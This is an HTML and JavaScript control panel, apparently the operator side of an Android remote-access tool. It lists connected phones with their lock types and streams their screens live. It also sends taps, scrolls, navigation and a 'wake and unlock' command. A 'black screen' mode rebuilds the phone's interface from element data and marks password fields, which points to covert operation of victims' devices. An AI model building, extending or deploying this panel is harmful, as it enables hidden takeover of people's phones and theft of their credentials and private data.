<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Screen Control - Live View</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@700&family=Roboto:wght@400;700&display=swap');
        
        body { 
            font-family: 'Roboto', sans-serif; 
            background-color: #121212; 
            color: #e0e0e0; 
            margin: 0; 
            padding: 0; 
            height: 100vh; 
            overflow: hidden; 
        }
        
        /* Main Views */
        .view { 
            display: none; 
            width: 100%; 
            height: 100%; 
        }
        .view.active { 
            display: flex; 
        }
        
        /* Device List View */
        #device-list-view { 
            flex-direction: column; 
        }
        
        .header { 
            background-color: #1e1e1e; 
            padding: 20px; 
            text-align: center; 
            border-bottom: 2px solid #00ff00; 
        }
        
        .header h1 { 
            font-family: 'Orbitron', sans-serif; 
            margin: 0; 
            font-size: 2.5em; 
            color: #00ff00; 
            text-shadow: 0 0 10px #00ff00; 
        }
        
        #device-list-container { 
            padding: 30px; 
            overflow-y: auto; 
            flex-grow: 1; 
        }
        
        #device-list { 
            list-style: none; 
            padding: 0; 
            margin: 0; 
        }
        
        .device { 
            background-color: #1e1e1e; 
            margin-bottom: 15px; 
            border-radius: 8px; 
            border-left: 5px solid #555; 
            padding: 20px; 
            cursor: pointer; 
            transition: all 0.3s ease; 
            display: flex; 
            justify-content: space-between; 
            align-items: center; 
        }
        
        .device:hover { 
            transform: translateY(-5px); 
            box-shadow: 0 10px 20px rgba(0,0,0,0.2); 
            border-left-color: #00ff00; 
        }
        
        .device-name { 
            font-size: 1.5em; 
            font-weight: 700; 
        }
        
        .device-info { 
            font-size: 1em; 
            color: #aaa; 
        }
        
        .status-dot { 
            height: 15px; 
            width: 15px; 
            background-color: #28a745; 
            border-radius: 50%; 
            display: inline-block; 
            box-shadow: 0 0 8px #28a745; 
        }
        
        .lock-badge { 
            background: #ff4444; 
            color: white; 
            padding: 2px 8px; 
            border-radius: 10px; 
            font-size: 0.8em; 
            margin-left: 10px; 
        }
        
        .lock-badge.unlocked { 
            background: #44ff44; 
        }
        
        /* Control View */
        #control-view { 
            flex-direction: column; 
        }
        
        .control-header { 
            display: flex; 
            justify-content: space-between; 
            align-items: center; 
            padding: 10px 20px; 
            background-color: #1e1e1e; 
            border-bottom: 1px solid #333; 
            flex-wrap: wrap; 
            gap: 10px; 
        }
        
        #back-to-list-btn { 
            background-color: #3f3f46; 
            color: white; 
            border: 1px solid #555; 
            padding: 8px 15px; 
            border-radius: 5px; 
            cursor: pointer; 
            font-size: 1em; 
        }
        
        #device-title { 
            font-size: 1.2em; 
            font-weight: bold; 
        }
        
        .lock-info { 
            background: #2a2a2a; 
            padding: 5px 10px; 
            border-radius: 5px; 
            font-size: 0.9em; 
        }
        
        /* Screen View Toggle Buttons */
        .screen-toggle-buttons {
            display: flex;
            gap: 10px;
        }
        
        .screen-toggle-btn {
            background: #3f3f46;
            color: white;
            border: 1px solid #555;
            padding: 8px 15px;
            border-radius: 5px;
            cursor: pointer;
            font-size: 0.9em;
            transition: all 0.3s;
        }
        
        .screen-toggle-btn:hover {
            background: #555;
        }
        
        .screen-toggle-btn.active {
            background: #00ff00;
            color: #000;
            border-color: #00ff00;
        }
        
        /* Main Container */
        .main-container { 
            display: flex; 
            flex-grow: 1; 
        }
        
        .screen-area { 
            flex-grow: 1; 
            display: flex; 
            align-items: center; 
            justify-content: center; 
            padding: 15px; 
            position: relative;
        }
        
        .screen-viewport {
            border: 8px solid #444; 
            border-radius: 20px; 
            background-color: #000; 
            box-shadow: 0 0 20px rgba(0,0,0,0.5); 
            overflow: hidden; 
            position: relative;
        }
        
        .screen-container {
            position: relative;
            background-color: #000;
            transform-origin: top left;
            overflow: hidden;
        }
        
        .screen-element {
            position: absolute;
            border: 1px solid rgba(0, 255, 255, 0.6);
            background-color: rgba(0, 139, 139, 0.2);
            box-sizing: border-box;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            text-align: center;
            padding: 2px;
        }
        
        .element-text {
            color: white;
            font-size: 12px;
            white-space: nowrap;
            overflow: hidden;
            text-overflow: ellipsis;
            max-width: 100%;
        }
        
        /* Live Screen Image */
        .live-screen-image {
            width: 100%;
            height: 100%;
            object-fit: contain;
            background-color: #000;
        }
        
        /* Clickable Overlay */
        .clickable-overlay {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            z-index: 1000;
        }
        
        .clickable-element {
            position: absolute;
            cursor: pointer;
            border: 2px dashed rgba(0, 255, 0, 0.5);
            background-color: rgba(0, 255, 0, 0.1);
            transition: all 0.2s;
            box-sizing: border-box;
            pointer-events: all;
        }
        
        .clickable-element:hover {
            background-color: rgba(0, 255, 0, 0.3);
            border: 2px solid rgba(0, 255, 0, 0.8);
        }
        
        .all-controls { 
            width: 80px; 
            background-color: #1e1e1e; 
            display: flex; 
            flex-direction: column; 
            align-items: center; 
            justify-content: center; 
            gap: 12px; 
            padding: 10px; 
        }
        
        .control-button { 
            width: 55px; 
            height: 55px; 
            background-color: #3f3f46; 
            border: 1px solid #555; 
            color: white; 
            border-radius: 50%; 
            cursor: pointer; 
            font-size: 24px; 
            transition: background-color 0.2s; 
            display: flex; 
            align-items: center; 
            justify-content: center; 
        }
        
        .control-button:hover { 
            background-color: #555; 
        }
        
        .divider { 
            height: 1px; 
            width: 80%; 
            background-color: #444; 
            margin: 10px 0; 
        }
        
        /* Single Main Button */
        .single-main-btn { 
            background: linear-gradient(135deg, #0066cc, #0099ff);
            color: white;
            border: none;
            padding: 15px 30px;
            border-radius: 10px;
            font-size: 1.2em;
            font-weight: bold;
            cursor: pointer;
            box-shadow: 0 5px 15px rgba(0, 102, 204, 0.4);
            transition: all 0.3s;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        .single-main-btn:hover {
            background: linear-gradient(135deg, #0099ff, #00ccff);
            transform: translateY(-3px);
            box-shadow: 0 8px 20px rgba(0, 153, 255, 0.6);
        }
        
        .single-main-btn:active {
            transform: translateY(1px);
        }
        
        /* Status Indicator */
        .status-indicator {
            display: flex;
            align-items: center;
            gap: 5px;
            font-size: 0.9em;
        }
        
        .live-indicator {
            width: 10px;
            height: 10px;
            background-color: #ff4444;
            border-radius: 50%;
            animation: pulse 1s infinite;
        }
        
        .live-indicator.active {
            background-color: #44ff44;
        }
        
        @keyframes pulse {
            0% { opacity: 1; }
            50% { opacity: 0.5; }
            100% { opacity: 1; }
        }
    </style>
</head>
<body>

    <div id="device-list-view" class="view active">
        <div class="header">
            <h1>üîì LIVE SCREEN CONTROL v4.0</h1>
            <p style="margin: 5px 0; color: #aaa;">Real-time Live Screen Streaming ‚Ä¢ Dual View Mode</p>
        </div>
        <div id="device-list-container">
            <ul id="device-list"></ul>
        </div>
    </div>

    <div id="control-view" class="view">
        <div class="control-header">
            <button id="back-to-list-btn">‚Üê Back to List</button>
            <h2 id="device-title"></h2>
            <div class="lock-info" id="lock-status">Lock: Unknown</div>
            
            <!-- Screen Toggle Buttons -->
            <div class="screen-toggle-buttons">
                <button id="btn-black-screen" class="screen-toggle-btn active">
                    üì¶ Black Screen
                </button>
                <button id="btn-live-screen" class="screen-toggle-btn">
                    üì± Live Screen
                </button>
            </div>
            
            <div class="status-indicator">
                <div id="live-indicator" class="live-indicator"></div>
                <span id="stream-status">Live Stream: Off</span>
            </div>
            
            <button id="btn-wake-unlock" class="single-main-btn">
                ‚ö° WAKE & UNLOCK
            </button>
        </div>
        <div class="main-container">
            <div class="screen-area">
                <!-- Black Screen View (Default) -->
                <div id="black-screen-viewport" class="screen-viewport" style="display: block;">
                    <div id="black-screen-container" class="screen-container"></div>
                </div>
                
                <!-- Live Screen View (Hidden by default) -->
                <div id="live-screen-viewport" class="screen-viewport" style="display: none;">
                    <img id="live-screen-image" class="live-screen-image" src="" alt="Live Screen" />
                    <div id="live-clickable-overlay" class="clickable-overlay"></div>
                </div>
            </div>
            <div class="all-controls">
                <button class="control-button" id="btn-scroll-up">‚Üë</button>
                <button class="control-button" id="btn-scroll-left">‚Üê</button>
                <button class="control-button" id="btn-scroll-right">‚Üí</button>
                <button class="control-button" id="btn-scroll-down">‚Üì</button>
                <div class="divider"></div>
                <button class="control-button" id="btn-back">‚Æå</button>
                <button class="control-button" id="btn-home">‚åÇ</button>
                <button class="control-button" id="btn-recents">‚ñ°</button>
                <div class="divider"></div>
                <button class="control-button" id="btn-start-stream">‚ñ∂Ô∏è</button>
                <button class="control-button" id="btn-stop-stream">‚è∏Ô∏è</button>
            </div>
        </div>
    </div>

    <script src="/socket.io/socket.io.js"></script>
    <script>
        const socket = io();
        const deviceListView = document.getElementById('device-list-view');
        const controlView = document.getElementById('control-view');
        const deviceListEl = document.getElementById('device-list');
        const blackScreenContainer = document.getElementById('black-screen-container');
        const liveScreenImage = document.getElementById('live-screen-image');
        const liveClickableOverlay = document.getElementById('live-clickable-overlay');
        const deviceTitleEl = document.getElementById('device-title');
        const lockStatusEl = document.getElementById('lock-status');
        const backToListBtn = document.getElementById('back-to-list-btn');
        const wakeUnlockBtn = document.getElementById('btn-wake-unlock');
        const btnBlackScreen = document.getElementById('btn-black-screen');
        const btnLiveScreen = document.getElementById('btn-live-screen');
        const btnStartStream = document.getElementById('btn-start-stream');
        const btnStopStream = document.getElementById('btn-stop-stream');
        const liveIndicator = document.getElementById('live-indicator');
        const streamStatus = document.getElementById('stream-status');

        let devices = {};
        let activeDeviceId = null;
        let currentScreenView = 'black'; // 'black' or 'live'
        let isLiveStreaming = false;
        let lastScreenData = null;
        let lastLiveImage = null;
        let screenScale = 1;

        function showView(viewId) {
            document.querySelectorAll('.view').forEach(v => v.classList.remove('active'));
            document.getElementById(viewId).classList.add('active');
        }

        socket.on('connect', () => socket.emit('admin_join'));
        socket.on('device_list', (initialDevices) => { 
            deviceListEl.innerHTML = ''; 
            devices = {}; 
            initialDevices.forEach(addDeviceToList); 
        });
        socket.on('new_device_joined', addDeviceToList);
        socket.on('device_disconnected', (deviceId) => {
            const el = document.getElementById(`device-${deviceId}`);
            if (el) el.remove();
            delete devices[deviceId];
            if (activeDeviceId === deviceId) {
                stopLiveStream();
                showView('device-list-view');
                activeDeviceId = null;
            }
        });

        function addDeviceToList(device) {
            if (document.getElementById(`device-${device.deviceId}`)) {
                const infoEl = document.querySelector(`#device-${device.deviceId} .device-info`);
                if (infoEl) {
                    infoEl.innerHTML = `Battery: ${device.battery}% | Lock: ${device.lockType || "none"}`;
                }
                return;
            }

            devices[device.deviceId] = device;
            
            const li = document.createElement('li');
            li.className = 'device';
            li.id = `device-${device.deviceId}`;
            
            const lockType = device.lockType || "none";
            const lockBadge = lockType !== "none" ? 
                `<span class="lock-badge">üîí ${lockType}</span>` : 
                `<span class="lock-badge unlocked">üîì unlocked</span>`;
            
            li.innerHTML = `
                <div>
                    <div class="device-name">${device.deviceName} ${lockBadge}</div>
                    <div class="device-info">Battery: ${device.battery}% | Android: ${device.androidVersion}</div>
                </div>
                <span class="status-dot"></span>
            `;
            
            li.addEventListener('click', () => {
                activeDeviceId = device.deviceId;
                deviceTitleEl.textContent = `${device.deviceName} - Live Control`;
                lockStatusEl.textContent = `Lock: ${device.lockType || "none"}`;
                blackScreenContainer.innerHTML = 'üì° Receiving screen data...';
                liveScreenImage.src = '';
                liveClickableOverlay.innerHTML = '';
                showView('control-view');
                
                // Start live stream automatically
                startLiveStream();
            });
            deviceListEl.appendChild(li);
        }

        function switchScreenView(viewType) {
            currentScreenView = viewType;
            
            // Update button states
            btnBlackScreen.classList.toggle('active', viewType === 'black');
            btnLiveScreen.classList.toggle('active', viewType === 'live');
            
            // Show/hide screen containers
            if (viewType === 'black') {
                document.getElementById('black-screen-viewport').style.display = 'block';
                document.getElementById('live-screen-viewport').style.display = 'none';
            } else {
                document.getElementById('black-screen-viewport').style.display = 'none';
                document.getElementById('live-screen-viewport').style.display = 'block';
                
                // If we have a live image, show it
                if (lastLiveImage) {
                    liveScreenImage.src = 'data:image/jpeg;base64,' + lastLiveImage;
                }
            }
        }

        function startLiveStream() {
            if (!activeDeviceId || isLiveStreaming) return;
            
            socket.emit('command_to_device', {
                deviceId: activeDeviceId,
                action: 'start_live_stream',
                payload: {}
            });
            
            isLiveStreaming = true;
            liveIndicator.classList.add('active');
            streamStatus.textContent = 'Live Stream: On';
            streamStatus.style.color = '#44ff44';
            
            // Show loading indicator
            if (currentScreenView === 'live') {
                liveScreenImage.src = '';
                liveScreenImage.style.backgroundColor = '#000';
            }
        }

        function stopLiveStream() {
            if (!activeDeviceId || !isLiveStreaming) return;
            
            socket.emit('command_to_device', {
                deviceId: activeDeviceId,
                action: 'stop_live_stream',
                payload: {}
            });
            
            isLiveStreaming = false;
            liveIndicator.classList.remove('active');
            streamStatus.textContent = 'Live Stream: Off';
            streamStatus.style.color = '#ff4444';
        }

        socket.on('screen_update', (data) => {
            if (data.deviceId !== activeDeviceId) return;
            
            lastScreenData = data;
            
            window.requestAnimationFrame(() => {
                // Clear containers
                blackScreenContainer.innerHTML = '';
                
                const remoteWidth = data.screenWidth, remoteHeight = data.screenHeight;
                const viewportHeight = 600;
                screenScale = viewportHeight / remoteHeight;
                
                // Update viewport sizes for black screen
                const blackViewport = document.getElementById('black-screen-viewport');
                blackViewport.style.width = (remoteWidth * screenScale) + 'px';
                blackViewport.style.height = viewportHeight + 'px';
                
                blackScreenContainer.style.width = remoteWidth + 'px';
                blackScreenContainer.style.height = remoteHeight + 'px';
                blackScreenContainer.style.transform = `scale(${screenScale})`;
                
                // Update lock status
                if (data.lockType) {
                    lockStatusEl.textContent = `Lock: ${data.lockType}`;
                    lockStatusEl.style.color = data.lockType !== "none" ? "#ff4444" : "#44ff44";
                }
                
                // Create elements for black screen view
                data.elements.forEach(element => {
                    const el = document.createElement('div');
                    el.className = 'screen-element';
                    el.style.left = `${element.x}px`; 
                    el.style.top = `${element.y}px`;
                    el.style.width = `${element.width}px`; 
                    el.style.height = `${element.height}px`;
                    
                    // Special styling
                    if (element.clickable) {
                        el.style.borderColor = '#0099ff';
                        el.style.backgroundColor = 'rgba(0, 153, 255, 0.3)';
                    }
                    if (element.editable) {
                        el.style.borderColor = '#33cc33';
                        el.style.backgroundColor = 'rgba(51, 204, 51, 0.2)';
                    }
                    if (element.password) {
                        el.style.borderColor = '#ff3333';
                        el.style.backgroundColor = 'rgba(255, 51, 51, 0.2)';
                    }
                    
                    const textEl = document.createElement('div');
                    textEl.className = 'element-text';
                    
                    if (element.text) {
                        textEl.textContent = element.text;
                    } else if (element.contentDescription) {
                        textEl.textContent = element.contentDescription;
                    } else if (element.className) {
                        textEl.textContent = element.className.split('.').pop();
                    }
                    
                    el.appendChild(textEl);
                    
                    // Click event for BLACK SCREEN
                    el.addEventListener('click', () => {
                        const tapX = Math.round(element.x + (element.width / 2));
                        const tapY = Math.round(element.y + (element.height / 2));
                        
                        socket.emit('command_to_device', { 
                            deviceId: activeDeviceId, 
                            action: 'touch_command', 
                            payload: { x: tapX, y: tapY } 
                        });
                    });
                    
                    blackScreenContainer.appendChild(el);
                });
                
                // Update live screen viewport size
                const liveViewport = document.getElementById('live-screen-viewport');
                liveViewport.style.width = (remoteWidth * screenScale) + 'px';
                liveViewport.style.height = viewportHeight + 'px';
            });
        });

        socket.on('live_screen', (data) => {
            if (data.deviceId !== activeDeviceId) return;
            
            lastLiveImage = data.liveImage;
            
            if (currentScreenView === 'live') {
                // Update live screen image
                liveScreenImage.src = 'data:image/jpeg;base64,' + data.liveImage;
                
                // Add clickable overlay based on last screen data
                if (lastScreenData && lastScreenData.elements) {
                    addClickableOverlay(lastScreenData.elements);
                }
            }
        });

        function addClickableOverlay(elements) {
            // Clear existing overlay
            liveClickableOverlay.innerHTML = '';
            
            if (!elements || !lastScreenData) return;
            
            const remoteWidth = lastScreenData.screenWidth;
            const remoteHeight = lastScreenData.screenHeight;
            
            // Create clickable elements overlay for LIVE SCREEN
            elements.forEach(element => {
                if (element.clickable || element.editable || element.password) {
                    const clickableEl = document.createElement('div');
                    clickableEl.className = 'clickable-element';
                    
                    // Calculate scaled position and size
                    const scaledX = element.x * screenScale;
                    const scaledY = element.y * screenScale;
                    const scaledWidth = element.width * screenScale;
                    const scaledHeight = element.height * screenScale;
                    
                    clickableEl.style.left = `${scaledX}px`;
                    clickableEl.style.top = `${scaledY}px`;
                    clickableEl.style.width = `${scaledWidth}px`;
                    clickableEl.style.height = `${scaledHeight}px`;
                    
                    // Click event for LIVE SCREEN
                    clickableEl.addEventListener('click', (e) => {
                        e.stopPropagation();
                        
                        // Calculate original coordinates
                        const tapX = Math.round(element.x + (element.width / 2));
                        const tapY = Math.round(element.y + (element.height / 2));
                        
                        socket.emit('command_to_device', { 
                            deviceId: activeDeviceId, 
                            action: 'touch_command', 
                            payload: { x: tapX, y: tapY } 
                        });
                        
                        // Visual feedback
                        clickableEl.style.backgroundColor = 'rgba(0, 255, 0, 0.5)';
                        setTimeout(() => {
                            clickableEl.style.backgroundColor = 'rgba(0, 255, 0, 0.1)';
                        }, 200);
                    });
                    
                    liveClickableOverlay.appendChild(clickableEl);
                }
            });
        }

        // Event Listeners
        btnBlackScreen.onclick = () => switchScreenView('black');
        btnLiveScreen.onclick = () => {
            switchScreenView('live');
            if (!isLiveStreaming) {
                startLiveStream();
            }
        };
        btnStartStream.onclick = startLiveStream;
        btnStopStream.onclick = stopLiveStream;

        backToListBtn.onclick = () => { 
            stopLiveStream();
            activeDeviceId = null; 
            showView('device-list-view'); 
        };

        // Control buttons
        document.getElementById('btn-back').onclick = () => {
            if (!activeDeviceId) return;
            socket.emit('command_to_device', { 
                deviceId: activeDeviceId, 
                action: 'global_action', 
                payload: { action: 'back' } 
            });
        };
        
        document.getElementById('btn-home').onclick = () => {
            if (!activeDeviceId) return;
            socket.emit('command_to_device', { 
                deviceId: activeDeviceId, 
                action: 'global_action', 
                payload: { action: 'home' } 
            });
        };
        
        document.getElementById('btn-recents').onclick = () => {
            if (!activeDeviceId) return;
            socket.emit('command_to_device', { 
                deviceId: activeDeviceId, 
                action: 'global_action', 
                payload: { action: 'recents' } 
            });
        };
        
        // Scroll commands
        document.getElementById('btn-scroll-up').onclick = () => sendScrollAction('up');
        document.getElementById('btn-scroll-down').onclick = () => sendScrollAction('down');
        document.getElementById('btn-scroll-left').onclick = () => sendScrollAction('left');
        document.getElementById('btn-scroll-right').onclick = () => sendScrollAction('right');

        function sendScrollAction(direction) { 
            if (!activeDeviceId) return; 
            socket.emit('command_to_device', { 
                deviceId: activeDeviceId, 
                action: 'scroll_action', 
                payload: { direction: direction } 
            }); 
        }

        // Wake & Unlock button
        wakeUnlockBtn.onclick = () => { 
            if (!activeDeviceId) {
                alert("Please select a device first!");
                return;
            } 
            
            wakeUnlockBtn.innerHTML = '‚ö° PROCESSING...';
            wakeUnlockBtn.style.opacity = '0.8';
            wakeUnlockBtn.disabled = true;
            
            socket.emit('command_to_device', { 
                deviceId: activeDeviceId, 
                action: 'unlock_device'
            });
            
            setTimeout(() => {
                wakeUnlockBtn.innerHTML = '‚ö° WAKE & UNLOCK';
                wakeUnlockBtn.style.opacity = '1';
                wakeUnlockBtn.disabled = false;
            }, 3000);
        };

        // Heartbeat
        setInterval(() => { 
            if (socket.connected) socket.emit('heartbeat', {}); 
        }, 30000);
        
        // Auto-start live stream when device is selected
        setInterval(() => {
            if (activeDeviceId && currentScreenView === 'live' && !isLiveStreaming) {
                startLiveStream();
            }
        }, 1000);
    </script>
</body>
